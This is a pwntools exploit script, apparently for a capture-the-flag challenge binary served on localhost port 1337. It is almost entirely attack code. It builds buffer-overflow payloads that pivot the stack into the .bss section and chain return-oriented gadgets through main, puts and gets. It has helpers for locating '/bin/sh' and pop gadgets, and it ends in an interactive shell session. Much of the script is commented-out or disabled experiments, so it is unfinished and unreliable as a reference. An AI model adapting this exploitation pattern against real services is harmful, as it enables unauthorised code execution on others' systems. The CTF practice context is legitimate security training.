from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
# context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *show_prompt
# b *0x00000000004011c5
# b *0x00000000004011d4
b *0x4011ca
# b *0x00000000004010e7
# b *0x401064
# b *0x4011e3
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

payload = b'a'*0x8
payload += b'b'*8
payload += p64(elf.bss() + 0x180)
payload += p64(elf.sym['main']+8)
payload += p64(elf.sym['main'])

sl(payload)

'''

payload = b'a'*0x10
payload += p64(0x00000000004041a0-8)
payload += p64(0x000000000040101a)*0x10
payload += p64(0x4011ca)
payload += p64(elf.plt['puts'])
# payload += p64(0)
# payload += p64(0x00000000004010e7)
# payload += p64(0x00000000004011ca)
# payload += p64(elf.plt['gets'])*0x100
payload += p64(elf.plt['gets'])
payload += p64(elf.plt['gets'])

# payload += b'b'*0x10
payload += p64(elf.plt['puts'])
payload += p64(0x000000000040115d)
payload += p64(0x404163)
payload += p64(0x00000000004011be)
payload += p64(0x00000000004011e3)

# payload = payload.ljust(0x100, b'a')
sl(payload)

ic(hex(elf.plt['puts']))
pause()
# payload = p64(elf.plt['puts'] + 0x10000)
# payload += b'a'*0x100
# payload = b'\x64\x10\x40\x00\x01'
# payload = b'a'*0x8
# sl(payload)


# # payload = b'\xe7\x10\x40\x00\x01'
# payload = b'a'*8
# sl(payload)

# for i in range(0x100):
#     sl(b'a'*0x7)

# sl('abcdefg')
# sl('xyza')
'''

payload = b'a'*0x10
# payload += p64(0x00000000004041a0-0x58)
payload += p64(elf.bss()+0x178)
payload += p64(elf.sym['main']+8)
payload += p64(elf.bss()+(0x180+0xe0))
payload += p64(0xdeadbeef)
payload += b'\x00'*0xb8
payload += p64(0)
payload += b'\x00'*88
payload += p64(elf.bss()+(0x180-0x48))

# payload += p64(elf.plt['puts'])
sl(payload)


# payload = b'a'*0x10
# payload += p64(0x00000000004041a0-8)
# payload += p64(0x000000000040101a)*0x10
# payload += p64(0x4011d6)
# # payload += p64(0x00000000004011be)
# # payload += p64(elf.plt['puts'])
# sl(payload)

# pause()
# payload = b'\xd8\x3f\x40\x00\x01'
# sl(payload)

# payload = p64(elf.got['puts']+0x21)

payload = p64(elf.bss()+0x1a0)
payload += p64(elf.bss()+0x260)
payload += p64(elf.bss()+0x190)
payload += p64(elf.plt['puts'])
payload += p64(gad(elf, ['ret']))
payload += p64(elf.sym['main'])
# payload += b'd'*8
# payload += b'z'*0x50
sl(payload)


io.interactive()
